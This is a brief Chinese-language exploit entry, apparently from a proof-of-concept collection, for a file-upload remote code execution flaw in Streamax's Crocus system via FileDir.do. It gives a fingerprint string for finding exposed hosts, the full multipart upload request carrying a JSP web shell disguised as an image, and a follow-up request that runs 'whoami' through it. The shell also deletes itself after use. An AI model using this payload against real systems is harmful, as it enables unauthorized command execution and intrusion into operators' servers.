# 锐明技术Crocus系统FileDir.do存在文件上传致RCE漏洞

- **系统**：锐明技术Crocus系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/ThirdResource/respond/respond.min.js"`
- **请求**：`POST /FileDir.do?Action=Upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
GET /Plugin/FileManage/Temp/175489491216260.jsp?cmd=whoami HTTP/1.1
```
- **预期**：200　|　—